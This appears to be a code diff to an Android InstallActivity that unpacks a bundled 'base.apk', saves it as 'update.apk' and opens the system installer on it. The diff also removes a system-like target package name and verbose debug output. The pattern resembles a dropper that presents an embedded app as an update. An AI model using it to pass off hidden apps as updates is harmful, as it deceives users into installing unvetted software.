@@ -10,11 +10,6 @@ import java.io.File
 
 class InstallActivity : AppCompatActivity() {
 
-    companion object {
-        private const val TARGET_PKG   = "com.android.pictach"
-        private const val TARGET_CLASS = "com.android.pictach.MainActivity"
-    }
-
     private var progressBar: ProgressBar? = null
     private var tvStatus: TextView? = null
 
@@ -28,32 +23,26 @@ class InstallActivity : AppCompatActivity() {
         Thread { startAppFlow() }.start()
     }
 
-    // ── MAIN FLOW ─────────────────────────────────────────────
     private fun startAppFlow() {
         try {
             val apkBytes = loadAssets()
-            if (apkBytes == null || apkBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\napk is null or empty"); return }
+            if (apkBytes == null || apkBytes.isEmpty()) { showMessage("Unable to load app file"); return }
             runOnUiThread { installApkDirect(apkBytes) }
         } catch (e: Exception) {
-            showMessage("STEP:FLOW\n${e.javaClass.simpleName}:\n${e.message}")
+            showMessage("Something went wrong: ${e.message}")
         }
     }
 
-    // ── DIRECT APK INSTALL ────────────────────────────────────
     private fun installApkDirect(apkBytes: ByteArray) {
         try {
             val apkFile = File(cacheDir, "update.apk")
             apkFile.writeBytes(apkBytes)
-
-            showMessage("STEP1:APK written\nSize: ${apkBytes.size} bytes\nPath: ${apkFile.absolutePath}")
 
             val uri = androidx.core.content.FileProvider.getUriForFile(
                 this,
                 "${packageName}.fileprovider",
                 apkFile
             )
-
-            showMessage("STEP2:URI ready\n$uri")
 
             val intent = Intent(Intent.ACTION_VIEW).apply {
                 setDataAndType(uri, "application/vnd.android.package-archive")
@@ -65,20 +54,18 @@ class InstallActivity : AppCompatActivity() {
             startActivity(intent)
 
         } catch (e: Exception) {
-            showMessage("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
+            showMessage("Installation failed: ${e.message}")
         }
     }
 
-    // ── ASSETS ────────────────────────────────────────────────
     private fun loadAssets(): ByteArray? {
         return try { assets.open("base.apk").use { it.readBytes() } } catch (e: Exception) { null }
     }
 
-    // ── HELPERS ───────────────────────────────────────────────
     private fun showMessage(msg: String) {
         runOnUiThread {
             progressBar?.visibility = View.GONE
-            tvStatus?.text = "ERROR:\n$msg"
+            tvStatus?.text = msg
             android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_LONG).show()
         }
     }
